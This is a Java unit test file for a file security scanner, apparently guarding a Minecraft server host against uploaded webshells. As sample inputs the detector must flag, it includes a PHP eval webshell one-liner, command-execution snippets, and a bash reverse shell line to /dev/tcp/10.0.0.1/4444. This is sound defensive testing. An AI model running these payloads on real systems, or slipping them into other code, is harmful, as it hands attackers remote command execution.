package com.aluer.defense;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.*;

class FileSecurityScannerServiceTest {

    @Test
    void detectsWebshellExtension() {
        assertNotNull(FileSecurityScannerService.detectSuspiciousFileName("shell.php"));
        assertNotNull(FileSecurityScannerService.detectSuspiciousFileName("backdoor.jsp"));
    }

    @Test
    void normalMinecraftFilesAreClean() {
        assertNull(FileSecurityScannerService.detectSuspiciousFileName("server.jar"));
        assertNull(FileSecurityScannerService.detectSuspiciousFileName("server.properties"));
        assertNull(FileSecurityScannerService.detectSuspiciousFileName("start.sh"));
    }

    @Test
    void detectsWebshellContent() {
        assertNotNull(FileSecurityScannerService.detectSuspiciousContent(
                "<?php eval($_POST['cmd']); ?>"));
        assertNotNull(FileSecurityScannerService.detectSuspiciousContent(
                "Runtime.getRuntime().exec(cmd)"));
        assertNotNull(FileSecurityScannerService.detectSuspiciousContent(
                "import os; os.system('id')"));
    }

    @Test
    void detectsReverseShellContent() {
        assertNotNull(FileSecurityScannerService.detectSuspiciousContent(
                "bash -i >& /dev/tcp/10.0.0.1/4444"));
    }

    @Test
    void normalContentIsClean() {
        assertNull(FileSecurityScannerService.detectSuspiciousContent(
                "eula=true\nonline-mode=true"));
        assertNull(FileSecurityScannerService.detectSuspiciousContent(""));
        assertNull(FileSecurityScannerService.detectSuspiciousContent(null));
    }

    @Test
    void blankFileNameIsClean() {
        assertNull(FileSecurityScannerService.detectSuspiciousFileName(""));
        assertNull(FileSecurityScannerService.detectSuspiciousFileName(null));
    }
}
